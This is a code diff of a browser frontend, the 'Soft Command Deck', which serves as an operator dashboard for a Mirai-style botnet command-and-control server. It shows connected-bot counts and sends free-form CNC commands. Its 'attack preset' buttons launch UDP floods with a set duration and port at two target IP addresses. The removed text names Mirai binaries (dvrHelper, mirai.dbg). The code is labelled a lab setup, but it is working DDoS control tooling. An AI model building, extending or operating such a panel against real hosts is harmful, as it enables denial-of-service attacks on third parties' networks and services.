@@ -1,279 +1,483 @@
-/* Soft Command Deck — frontend */
+/* Soft Command Deck.exe frontend */
 
 const $ = (sel) => document.querySelector(sel);
-const consoleEl = $("#console");
-const botCountEl = $("#bot-count");
-const heroSub = $("#hero-sub");
-const distChips = $("#dist-chips");
-const peerCount = $("#peer-count");
-const pillCnc = $("#pill-cnc");
-const pillBots = $("#pill-bots");
+const $$ = (sel) => Array.from(document.querySelectorAll(sel));
+
+const refs = {
+  console: $("#console"),
+  botCount: $("#bot-count"),
+  botCountPanel: $("#bot-count-panel"),
+  botStateLabel: $("#bot-state-label"),
+  botLabel: $("#bot-label"),
+  botStatusText: $("#bot-status-text"),
+  botLed: $("#bot-led"),
+  botLedSecondary: $("#bot-led-secondary"),
+  cncLabel: $("#cnc-label"),
+  cncStatusText: $("#cnc-status-text"),
+  cncLed: $("#cnc-led"),
+  cncLedSecondary: $("#cnc-led-secondary"),
+  peerCount: $("#peer-count"),
+  lastRefresh: $("#last-refresh"),
+  lastCommand: $("#last-command"),
+  lastError: $("#last-error"),
+  distRows: $("#dist-rows"),
+  statusMessage: $("#status-message"),
+  terminalStatus: $("#terminal-status"),
+  commandInput: $("#cmd-input"),
+  sendButton: $("#btn-send"),
+  clock: $("#clock"),
+  toasts: $("#toasts"),
+};
+
+const labState = {
+  c2: "185.10.20.100",
+  loader: "185.10.20.200",
+  sg: "203.0.113.100",
+  kr: "210.89.0.100",
+};
 
 let localLogClear = false;
 let lastBots = 0;
+let targetTimers = {};
 
-function toast(msg, kind = "good") {
-  const wrap = $("#toasts");
-  const el = document.createElement("div");
-  el.className = `toast ${kind}`;
-  el.textContent = msg;
-  wrap.appendChild(el);
-  setTimeout(() => el.remove(), 3200);
+function setText(el, value) {
+  if (el) el.textContent = value;
+}
+
+function setLed(el, state) {
+  if (!el) return;
+  el.classList.remove("ok", "waiting", "down");
+  el.classList.add(state);
+}
+
+function showToast(title, message, kind = "good") {
+  if (!refs.toasts) return;
+  const toast = document.createElement("div");
+  toast.className = `toast ${kind}`;
+
+  const head = document.createElement("div");
+  head.className = "toast-title";
+  head.textContent = title;
+
+  const body = document.createElement("div");
+  body.className = "toast-body";
+  body.textContent = message;
+
+  toast.append(head, body);
+  refs.toasts.appendChild(toast);
+  setTimeout(() => toast.remove(), 3600);
 }
 
 function pushConsole(line, cls = "") {
-  if (!consoleEl) return;
+  if (!refs.console) return;
   const div = document.createElement("div");
-  div.className = `line ${cls}`;
+  div.className = `line ${cls}`.trim();
   div.textContent = line;
-  consoleEl.appendChild(div);
-  consoleEl.scrollTop = consoleEl.scrollHeight;
-  while (consoleEl.children.length > 250) {
-    consoleEl.removeChild(consoleEl.firstChild);
+  refs.console.appendChild(div);
+  refs.console.scrollTop = refs.console.scrollHeight;
+
+  while (refs.console.children.length > 300) {
+    refs.console.removeChild(refs.console.firstChild);
   }
+}
+
+function classifyLog(line) {
+  if (line.includes("[ERR]")) return "err";
+  if (line.includes("[OK]")) return "ok";
+  if (line.includes("[CMD]")) return "cmd";
+  if (line.includes("[CNC]")) return "cnc";
+  return "sys";
 }
 
 function renderLogs(logs = []) {
-  if (localLogClear) return;
-  consoleEl.innerHTML = "";
-  logs.forEach((line) => {
-    let cls = "";
-    if (line.includes("[ERR]")) cls = "err";
-    else if (line.includes("[OK]")) cls = "ok";
-    else if (line.includes("[CMD]")) cls = "cmd";
-    else if (line.includes("[CNC]")) cls = "cnc";
-    pushConsole(line, cls);
-  });
+  if (!refs.console || localLogClear) return;
+  refs.console.innerHTML = "";
+
+  if (!logs.length) {
+    pushConsole("[SYS] no dashboard logs yet", "sys");
+    return;
+  }
+
+  logs.forEach((line) => pushConsole(line, classifyLog(line)));
 }
 
-function setBots(n) {
-  const v = Number(n) || 0;
-  botCountEl.textContent = String(v);
-  if (v !== lastBots) {
-    botCountEl.classList.remove("pop");
-    void botCountEl.offsetWidth;
-    botCountEl.classList.add("pop");
-    lastBots = v;
-  }
-  pillBots.classList.toggle("on", v > 0);
-  pillBots.classList.toggle("warn", v === 0);
-  $(".n-bot")?.classList.toggle("live", v > 0);
-  $(".n-c2")?.classList.toggle("live", true);
+function setNodeState(id, state) {
+  const node = $(`#${id}`);
+  if (!node) return;
+  node.classList.remove("online", "waiting", "offline");
+  if (state) node.classList.add(state);
+}
+
+function markTargetActive(target) {
+  const node = target === "kr" ? $("#node-kr") : $("#node-sg");
+  if (!node) return;
+
+  node.classList.add("active", "online");
+  clearTimeout(targetTimers[target]);
+  targetTimers[target] = setTimeout(() => {
+    node.classList.remove("active");
+  }, 8000);
 }
 
 function setCnc(up) {
-  pillCnc.classList.toggle("on", !!up);
-  pillCnc.classList.toggle("warn", !up);
+  const state = up ? "ok" : "down";
+  setLed(refs.cncLed, state);
+  setLed(refs.cncLedSecondary, state);
+  setText(refs.cncLabel, up ? "online" : "offline");
+  setText(refs.cncStatusText, up ? "online" : "offline");
+  setNodeState("node-c2", up ? "online" : "offline");
 }
 
-function renderDist(dist = {}) {
-  distChips.innerHTML = "";
-  const keys = Object.keys(dist);
-  if (!keys.length) {
-    distChips.innerHTML = `<span class="chip">no source tags · total only</span>`;
+function setBots(n, cncUp = true) {
+  const value = Number(n) || 0;
+  const state = value > 0 ? "ok" : "waiting";
+  const label = value > 0 ? "connected" : "waiting";
+
+  setText(refs.botCount, String(value));
+  setText(refs.botLabel, label);
+  setText(refs.botStatusText, cncUp ? label : "waiting");
+  setText(refs.botStateLabel, value > 0 ? "bots connected" : "waiting for bots");
+  setLed(refs.botLed, state);
+  setLed(refs.botLedSecondary, state);
+  setNodeState("node-bots", value > 0 ? "online" : "waiting");
+
+  if (refs.botCountPanel) {
+    refs.botCountPanel.dataset.state = state === "ok" ? "ok" : "waiting";
+  }
+
+  if (value !== lastBots && refs.botCount) {
+    refs.botCount.classList.remove("pop");
+    void refs.botCount.offsetWidth;
+    refs.botCount.classList.add("pop");
+    lastBots = value;
+  }
+}
+
+function renderDistribution(distribution = {}) {
+  if (!refs.distRows) return;
+  refs.distRows.innerHTML = "";
+  const entries = Object.entries(distribution).sort(([a], [b]) => a.localeCompare(b));
+
+  if (!entries.length) {
+    const tr = document.createElement("tr");
+    const td = document.createElement("td");
+    td.colSpan = 2;
+    td.textContent = "No source tags reported";
+    tr.appendChild(td);
+    refs.distRows.appendChild(tr);
     return;
   }
-  keys.forEach((k) => {
-    const chip = document.createElement("span");
-    chip.className = "chip";
-    chip.innerHTML = `${escapeHtml(k)} · <strong>${dist[k]}</strong>`;
-    distChips.appendChild(chip);
+
+  entries.forEach(([source, count]) => {
+    const tr = document.createElement("tr");
+    const sourceTd = document.createElement("td");
+    const countTd = document.createElement("td");
+    sourceTd.textContent = source;
+    countTd.textContent = String(count);
+    tr.append(sourceTd, countTd);
+    refs.distRows.appendChild(tr);
   });
 }
 
-function escapeHtml(s) {
-  return String(s)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;");
+function updateLab(lab) {
+  if (!lab) return;
+  labState.c2 = lab.c2 || labState.c2;
+  labState.loader = lab.loader || labState.loader;
+  labState.sg = lab.target_sg || labState.sg;
+  labState.kr = lab.target_kr || labState.kr;
+
+  setText($("#ip-c2"), labState.c2);
+  setText($("#ip-loader"), labState.loader);
+  setText($("#ip-sg"), labState.sg);
+  setText($("#ip-kr"), labState.kr);
+  setNodeState("node-loader", "online");
 }
 
-async function api(path, opts) {
+function updateLastRefresh() {
+  const label = new Date().toLocaleTimeString([], {
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+  });
+  setText(refs.lastRefresh, label);
+}
+
+function updateFromStatus(data) {
+  const cncUp = Boolean(data.cnc_up);
+  const botTotal = Number(data.bot_total || 0);
+
+  setCnc(cncUp);
+  setBots(botTotal, cncUp);
+  renderDistribution(data.distribution || {});
+  updateLab(data.lab);
+  updateLastRefresh();
+
+  const peers = data.tcp_peers === undefined || data.tcp_peers < 0 ? "-" : String(data.tcp_peers);
+  setText(refs.peerCount, peers);
+
+  if (data.error) {
+    setText(refs.lastError, data.error);
+  } else {
+    setText(refs.lastError, "none");
+  }
+
+  if (cncUp && botTotal > 0) {
+    setText(refs.statusMessage, `CNC online, ${botTotal} bots connected`);
+    setText(refs.terminalStatus, "CNC online");
+  } else if (cncUp) {
+    setText(refs.statusMessage, "CNC online, bot counter waiting");
+    setText(refs.terminalStatus, "CNC online, waiting for bots");
+  } else {
+    setText(refs.statusMessage, data.error || "CNC offline");
+    setText(refs.terminalStatus, "CNC offline");
+  }
+
+  if (data.logs) renderLogs(data.logs);
+}
+
+async function api(path, opts = {}) {
   const res = await fetch(path, {
     headers: { "Content-Type": "application/json" },
     ...opts,
   });
-  const data = await res.json().catch(() => ({}));
-  if (!res.ok && !data.error) data.error = res.statusText;
+  const text = await res.text();
+  let data = {};
+
+  if (text) {
+    try {
+      data = JSON.parse(text);
+    } catch {
+      data = { ok: false, error: text };
+    }
+  }
+
+  if (!res.ok) {
+    data.ok = false;
+    data.error = data.error || res.statusText || `HTTP ${res.status}`;
+  }
+
   return data;
 }
 
-async function refreshStatus() {
+async function refreshStatus({ toast = false } = {}) {
   try {
     const data = await api("/api/status");
-    setCnc(!!data.cnc_up);
-    setBots(data.bot_total ?? 0);
-    renderDist(data.distribution || {});
-    peerCount.textContent =
-      data.tcp_peers === undefined || data.tcp_peers < 0
-        ? "—"
-        : String(data.tcp_peers);
-
-    if (data.lab) {
-      $("#meta-c2").textContent = data.lab.c2 || "185.10.20.100";
-      $("#meta-loader").textContent = data.lab.loader || "185.10.20.200";
-      $("#ip-sg").textContent = data.lab.target_sg || "203.0.113.100";
-      $("#ip-kr").textContent = data.lab.target_kr || "210.89.0.100";
-    }
-
-    if (data.cnc_up) {
-      heroSub.textContent =
-        (data.bot_total || 0) > 0
-          ? "Fleet is online · CNC accepted bot handshake ✨"
-          : "CNC is up · waiting for bots (try dvrHelper / mirai.dbg on bot nodes)";
-    } else {
-      heroSub.textContent =
-        data.error || "CNC offline — start ./cnc on this machine first";
-    }
-
-    if (data.logs) renderLogs(data.logs);
-    if (data.error && !data.ok) {
-      /* quiet unless hard fail */
-    }
-  } catch (e) {
+    updateFromStatus(data);
+    if (toast) showToast("Status refreshed", "Latest CNC and bot counters loaded");
+    return data;
+  } catch (error) {
     setCnc(false);
-    heroSub.textContent = "Dashboard API unreachable — is python app.py running?";
-    pushConsole(`[ERR] ${e.message}`, "err");
+    setBots(0, false);
+    setText(refs.lastError, error.message);
+    setText(refs.statusMessage, "Dashboard API unreachable");
+    setText(refs.terminalStatus, "API unreachable");
+    pushConsole(`[ERR] ${error.message}`, "err");
+    if (toast) showToast("Status failed", error.message, "bad");
+    return { ok: false, error: error.message };
   }
+}
+
+function setLastCommand(command) {
+  setText(refs.lastCommand, command || "none");
+}
+
+function attackCommandText({ target, method, duration, dport }) {
+  const ip = target === "kr" ? labState.kr : labState.sg;
+  return `${method} ${ip} ${duration} dport=${dport}`;
 }
 
 async function sendCommand(command) {
-  if (!command) return;
+  const trimmed = (command || "").trim();
+  if (!trimmed) {
+    showToast("Command required", "Enter a CNC command first", "warn");
+    refs.commandInput?.focus();
+    return;
+  }
+
   localLogClear = false;
-  pushConsole(`[ui] sending: ${command}`, "cmd");
+  setLastCommand(trimmed);
+  pushConsole(`[UI] > ${trimmed}`, "cmd");
+
   try {
     const data = await api("/api/command", {
       method: "POST",
-      body: JSON.stringify({ command }),
+      body: JSON.stringify({ command: trimmed }),
     });
+
     if (data.ok) {
-      toast(`OK · ${command}`, "good");
-      setBots(data.bot_total ?? lastBots);
-      renderDist(data.distribution || {});
+      showToast("Command OK", trimmed);
       if (data.response) {
-        data.response.split("\n").forEach((line) => {
-          if (line.trim()) pushConsole(line.trim(), "cnc");
-        });
+        data.response
+          .split("\n")
+          .filter((line) => line.trim())
+          .forEach((line) => pushConsole(line.trim(), "cnc"));
       }
+      updateFromStatus(data);
     } else {
-      toast(data.error || "Command failed", "bad");
-      pushConsole(`[ERR] ${data.error || "failed"}`, "err");
+      const message = data.error || "Command failed";
+      showToast("Command failed", message, "bad");
+      setText(refs.lastError, message);
+      pushConsole(`[ERR] ${message}`, "err");
+      if (data.logs) renderLogs(data.logs);
     }
-    if (data.logs) renderLogs(data.logs);
+
     await refreshStatus();
-  } catch (e) {
-    toast(e.message, "bad");
-    pushConsole(`[ERR] ${e.message}`, "err");
+  } catch (error) {
+    showToast("Command failed", error.message, "bad");
+    setText(refs.lastError, error.message);
+    pushConsole(`[ERR] ${error.message}`, "err");
   }
 }
 
-async function sendAttack(target) {
+async function sendAttack(config) {
+  const target = config.target;
+  const method = config.method || "udp";
+  const duration = Number(config.duration || 30);
+  const dport = Number(config.dport || 80);
+  const commandText = attackCommandText({ target, method, duration, dport });
+
   localLogClear = false;
-  pushConsole(`[ui] attack preset → ${target}`, "cmd");
+  setLastCommand(commandText);
+  pushConsole(`[UI] preset -> ${commandText}`, "cmd");
+
   try {
     const data = await api("/api/attack", {
       method: "POST",
-      body: JSON.stringify({ target, duration: 30, method: "udp", dport: 80 }),
+      body: JSON.stringify({ target, duration, method, dport }),
     });
+
     if (data.ok) {
-      toast(`Pulse sent · ${data.target_ip || target}`, "good");
-      pushConsole(`[OK] ${data.command || target}`, "ok");
-      $(".n-sg")?.classList.toggle("live", target === "sg");
-      $(".n-kr")?.classList.toggle("live", target === "kr");
-      setTimeout(() => {
-        $(".n-sg")?.classList.remove("live");
-        $(".n-kr")?.classList.remove("live");
-      }, 8000);
+      const sent = data.command || commandText;
+      showToast("Lab preset sent", sent);
+      pushConsole(`[OK] ${sent}`, "ok");
+      markTargetActive(target);
+      updateFromStatus(data);
     } else {
-      toast(data.error || "Attack failed", "bad");
-      pushConsole(`[ERR] ${data.error || "failed"}`, "err");
+      const message = data.error || "Attack preset failed";
+      showToast("Preset failed", message, "bad");
+      setText(refs.lastError, message);
+      pushConsole(`[ERR] ${message}`, "err");
+      if (data.logs) renderLogs(data.logs);
     }
-    if (data.logs) renderLogs(data.logs);
+
     await refreshStatus();
-  } catch (e) {
-    toast(e.message, "bad");
+  } catch (error) {
+    showToast("Preset failed", error.message, "bad");
+    setText(refs.lastError, error.message);
+    pushConsole(`[ERR] ${error.message}`, "err");
   }
 }
 
-/* sparkle canvas */
-function initSparkles() {
-  const canvas = $("#sparkles");
-  if (!canvas) return;
-  const ctx = canvas.getContext("2d");
-  let w, h, dots;
-
-  function resize() {
-    w = canvas.width = window.innerWidth;
-    h = canvas.height = window.innerHeight;
-    dots = Array.from({ length: 48 }, () => ({
-      x: Math.random() * w,
-      y: Math.random() * h,
-      r: Math.random() * 1.8 + 0.4,
-      a: Math.random() * 0.5 + 0.15,
-      v: Math.random() * 0.25 + 0.05,
-    }));
+async function withBusy(button, task) {
+  if (button) {
+    button.disabled = true;
+    button.classList.add("is-busy");
   }
 
-  function frame() {
-    ctx.clearRect(0, 0, w, h);
-    for (const d of dots) {
-      d.y -= d.v;
-      if (d.y < -4) {
-        d.y = h + 4;
-        d.x = Math.random() * w;
-      }
-      ctx.beginPath();
-      ctx.fillStyle = `rgba(255, 190, 230, ${d.a})`;
-      ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
-      ctx.fill();
+  try {
+    await task();
+  } finally {
+    if (button) {
+      button.disabled = false;
+      button.classList.remove("is-busy");
     }
-    requestAnimationFrame(frame);
   }
+}
 
-  resize();
-  window.addEventListener("resize", resize);
-  frame();
+async function copyBlock(targetId) {
+  const target = document.getElementById(targetId);
+  const text = target?.textContent?.trim();
+  if (!text) return;
+
+  try {
+    if (navigator.clipboard?.writeText) {
+      await navigator.clipboard.writeText(text);
+    } else {
+      const area = document.createElement("textarea");
+      area.value = text;
+      area.setAttribute("readonly", "");
+      area.style.position = "fixed";
+      area.style.left = "-9999px";
+      document.body.appendChild(area);
+      area.select();
+      document.execCommand("copy");
+      area.remove();
+    }
+    showToast("Copied", targetId.replace("cheat-", ""));
+  } catch (error) {
+    showToast("Copy failed", error.message, "bad");
+  }
 }
 
 function tickClock() {
-  const el = $("#clock");
+  if (!refs.clock) return;
+  refs.clock.textContent = new Date().toLocaleTimeString([], {
+    hour: "2-digit",
+    minute: "2-digit",
+  });
+}
+
+function focusWindow(id) {
+  const el = document.getElementById(id);
   if (!el) return;
-  const t = new Date();
-  el.textContent = t.toLocaleString();
+  $$(".focus-window").forEach((node) => node.classList.remove("focus-window"));
+  el.classList.add("focus-window");
+  el.scrollIntoView({ block: "nearest", behavior: "smooth" });
+  setTimeout(() => el.classList.remove("focus-window"), 1600);
 }
 
 function bind() {
-  $("#btn-refresh")?.addEventListener("click", () => {
-    refreshStatus();
-    toast("Refreshed");
-  });
-  $("#btn-status")?.addEventListener("click", () => refreshStatus());
-  $("#btn-send")?.addEventListener("click", () => {
-    const v = $("#cmd-input").value.trim();
-    sendCommand(v);
-  });
-  $("#cmd-input")?.addEventListener("keydown", (e) => {
-    if (e.key === "Enter") {
-      sendCommand(e.target.value.trim());
-    }
-  });
-  $("#btn-clear-log")?.addEventListener("click", () => {
-    consoleEl.innerHTML = "";
-    localLogClear = true;
-    pushConsole("[ui] view cleared (server logs still collecting)", "cmd");
+  $("#btn-refresh")?.addEventListener("click", (event) => {
+    withBusy(event.currentTarget, () => refreshStatus({ toast: true }));
   });
 
-  document.querySelectorAll("[data-cmd]").forEach((btn) => {
-    btn.addEventListener("click", () => sendCommand(btn.getAttribute("data-cmd")));
+  $("#command-form")?.addEventListener("submit", (event) => {
+    event.preventDefault();
+    withBusy(refs.sendButton, () => sendCommand(refs.commandInput?.value || ""));
   });
-  document.querySelectorAll("[data-attack]").forEach((btn) => {
-    btn.addEventListener("click", () => sendAttack(btn.getAttribute("data-attack")));
+
+  $("#btn-clear-log")?.addEventListener("click", () => {
+    if (!refs.console) return;
+    refs.console.innerHTML = "";
+    localLogClear = true;
+    pushConsole("[UI] local console view cleared", "cmd");
+  });
+
+  $$("[data-cmd]").forEach((button) => {
+    button.addEventListener("click", () => {
+      withBusy(button, () => sendCommand(button.getAttribute("data-cmd")));
+    });
+  });
+
+  $$("[data-action='refresh']").forEach((button) => {
+    button.addEventListener("click", () => {
+      withBusy(button, () => refreshStatus({ toast: true }));
+    });
+  });
+
+  $$("[data-attack-target]").forEach((button) => {
+    button.addEventListener("click", () => {
+      withBusy(button, () =>
+        sendAttack({
+          target: button.getAttribute("data-attack-target"),
+          method: button.getAttribute("data-method"),
+          duration: button.getAttribute("data-duration"),
+          dport: button.getAttribute("data-dport"),
+        }),
+      );
+    });
+  });
+
+  $$("[data-copy-target]").forEach((button) => {
+    button.addEventListener("click", () => copyBlock(button.getAttribute("data-copy-target")));
+  });
+
+  $$("[data-focus-window]").forEach((button) => {
+    button.addEventListener("click", () => focusWindow(button.getAttribute("data-focus-window")));
   });
 }
 
 bind();
-initSparkles();
 tickClock();
 setInterval(tickClock, 1000);
 refreshStatus();
